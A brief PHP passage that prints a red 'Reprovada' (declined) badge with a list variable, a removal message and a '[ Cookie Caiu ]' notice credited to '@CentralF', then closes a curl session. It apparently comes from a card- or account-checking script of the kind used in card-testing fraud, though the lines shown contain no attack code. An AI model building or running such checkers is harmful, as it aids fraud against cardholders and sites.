    echo "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Reprovada</span> » $lista » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Removido: $msg</span> » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Cookie Caiu ]</span> » @CentralF</b></font><br>";
    curl_close($curl);
    exit();

        

             #   }
                }